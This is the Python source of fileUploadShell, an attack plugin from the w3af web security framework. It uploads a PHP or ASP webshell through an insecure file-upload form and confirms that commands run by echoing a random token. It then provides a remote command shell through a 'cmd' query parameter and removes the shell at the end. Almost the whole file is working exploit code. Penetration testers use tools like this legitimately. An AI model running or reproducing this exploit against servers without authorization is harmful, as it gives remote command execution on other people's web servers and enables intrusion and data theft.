'''
fileUploadShell.py

Copyright 2006 Andres Riancho

This file is part of w3af, w3af.sourceforge.net .

w3af is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

w3af is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with w3af; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA

'''


from core.data.fuzzer.fuzzer import *
import core.controllers.outputManager as om
# options
from core.data.options.option import option
from core.data.options.optionList import optionList
from core.controllers.basePlugin.baseAttackPlugin import baseAttackPlugin

import core.data.kb.knowledgeBase as kb
import core.data.kb.vuln as vuln
from core.data.kb.shell import shell as shell

import core.data.parsers.urlParser as urlParser
from core.controllers.w3afException import w3afException
from plugins.attack.webshells.getShell import getShell
import os
import os.path
import urllib

class fileUploadShell(baseAttackPlugin):
    '''
    Exploit applications that allow unrestricted file uploads inside the webroot.
    @author: Andres Riancho ( andres.riancho@gmail.com )
    '''

    def __init__(self):
        baseAttackPlugin.__init__(self)
        self._pathName = ''
        self._fname = ''
        
        # User configured variables ( for fastExploit )
        self._url = ''
        self._method = 'POST'
        self._data = ''
        self._fileVars = ''
        self._fileDest = ''

    def fastExploit( self ):
        '''
        Exploits a web app with file upload vuln.
        '''
        if self._url == '' or self._fileVars == '' or self._fileDest == '' :
            om.out.error('You have to configure the plugin parameters.')
        else:
            v = vuln.vuln()
            v.setURL( self._url )
            v.setMethod( self._method )
            v.setDc( self._data )
            v['fileVars'] = self._fileVars
            v['fileDest'] = self._fileDest
            kb.kb.append( 'fileUpload', 'fileUpload', v )

    def getAttackType(self):
        return 'shell'

    def getVulnName2Exploit( self ):
        return 'fileUpload'
                
    def _generateShell( self, vuln ):
        '''
        @parameter vuln: The vuln to exploit.
        @return: True is a shell object based on the param vuln was created ok.
        '''
        # Check if we really can execute commands on the remote server
        if self._verifyVuln( vuln ):
            
            # Set shell parameters
            s = fuShell( vuln )
            s.setUrlOpener( self._urlOpener )
            s.setExploitURL( self._exploit )
            return s
        else:
            return None

    def _verifyVuln( self, vuln ):
        '''
        This command verifies a vuln. This is really hard work! :P

        @return : True if vuln can be exploited.
        '''
        # The vuln was saved to the kb as a vuln object
        url = vuln.getURL()
        method = vuln.getMethod()
        exploitQs = vuln.getDc()

        # Create a file that will be uploaded
        extension = urlParser.getExtension( url )
        fname = self._createFile( extension )
        fd = open( fname , "r")
        
        # Upload the file
        for f in vuln['fileVars']:
            exploitQs[f] = fd
        response = self._urlOpener.POST( vuln.getURL() ,  exploitQs )
        
        dst = vuln['fileDest']
        rnd = createRandAlNum( 8 )
        cmd = 'echo+%22' + rnd + '%22'
        
        self._exploit = urlParser.getDomainPath( dst ) + self._fname + '?cmd='
        toSend = urlParser.getDomainPath( dst ) + self._fname + '?cmd=' + cmd
        
        fd.close()
        os.remove( self._pathName )
        response = self._urlOpener.GET( toSend )
        if response.getBody().count( rnd ):
            return True
        else:
            return False
    
    def _createFile( self, extension ):
        '''
        Create a file with a webshell as content.
        @return: Name of the file that was created.
        '''
        dir = '.tmp' + os.path.sep
        try:
            if not os.path.exists( dir ):
                os.mkdir( dir )
        except:
            raise w3afException('Could not create '+ dir + ' directory.')
        
        fileContent, realExtension = getShell( extension, forceExtension=True )[0]
        if extension == '':
            extension = realExtension
            
        fname = createRandAlNum( 8 ) + '.' +extension
        self._pathName = dir + fname
        self._fname = fname
        fd = None
        try:
            fd = file(  self._pathName , 'w' )
        except:
            raise w3afException('Could not create file: ' + self._pathName )
        
        fd.write( fileContent )
        fd.close()
        return self._pathName
    
    def getOptions( self ):
        '''
        @return: A list of option objects for this plugin.
        '''
        d1 = 'URL to exploit with fastExploit()'
        o1 = option('url', self._url, d1, 'string')
        
        d2 = 'Method to use with fastExploit()'
        o2 = option('method', self._method, d2, 'string')

        d3 = 'Data to send with fastExploit()'
        o3 = option('data', self._data, d3, 'string')

        d4 = 'The variable in data that holds the file content. Only used in fastExploit()'
        o4 = option('fileVars', self._fileVars, d4, 'string')

        d5 = 'The URI of the uploaded file. Only used with fastExploit()'
        o5 = option('fileDest', self._fileDest, d5, 'string')
        
        ol = optionList()
        ol.add(o1)
        ol.add(o2)
        ol.add(o3)
        ol.add(o4)
        ol.add(o5)
        return ol

    def setOptions( self, optionsMap ):
        '''
        This method sets all the options that are configured using the user interface 
        generated by the framework using the result of getOptionsXML().
        
        @parameter OptionList: A dictionary with the options for the plugin.
        @return: No value is returned.
        ''' 
        self._url = optionsMap['url'].getValue()
        self._method = optionsMap['method'].getValue()
        self._data = urlParser.getQueryString( optionsMap['data'].getValue() )
        self._fileVars = optionsMap['fileVars'].getValue()
        self._fileDest = optionsMap['fileDest'].getValue()

    def getPluginDeps( self ):
        '''
        @return: A list with the names of the plugins that should be runned before the
        current one.
        '''
        return ['discovery.serverHeader']

    def getRootProbability( self ):
        '''
        @return: This method returns the probability of getting a root shell using this attack plugin.
        This is used by the "exploit *" function to order the plugins and first try to exploit the more critical ones.
        This method should return 0 for an exploit that will never return a root shell, and 1 for an exploit that WILL ALWAYS
        return a root shell.
        '''
        return 0.8
        
    def getLongDesc( self ):
        '''
        @return: A DETAILED description of the plugin functions and features.
        '''
        return '''
        This plugin exploits insecure file uploads and returns a shell. It's rather simple, using a form
        the plugin uploads the corresponding webshell ( php, asp, etc. ) verifies that the shell is working, and if
        everything is working as expected the user can start typing commands.
        
        No configurable parameters exist.
        '''

class fuShell(shell):
    def setExploitURL( self, eu ):
        self._exploit = eu
    
    def getExploitURL( self ):
        return self._exploit
        
    def _rexec( self, command ):
        '''
        This method is called when a command is being sent to the remote server.
        This is a NON-interactive shell.

        @parameter command: The command to send ( ie. "ls", "whoami", etc ).
        @return: The result of the command.
        '''
        toSend = self.getExploitURL() + urllib.quote_plus( command )
        response = self._urlOpener.GET( toSend )
        return response.getBody()
        
    def end( self ):
        om.out.debug('File upload shell is going to delete the webshell that was uploaded before.')
        fileToDel = urlParser.getFileName( self.getExploitURL() )
        try:
            self.removeFile(fileToDel)
        except w3afException, e:
            om.out.error('File upload shell cleanup failed with exception: ' + str(e) )
        else:
            om.out.debug('File upload shell cleanup complete; successfully removed file: "' + fileToDel + '"')
    
    def getName( self ):
        return 'fileUploadShell'
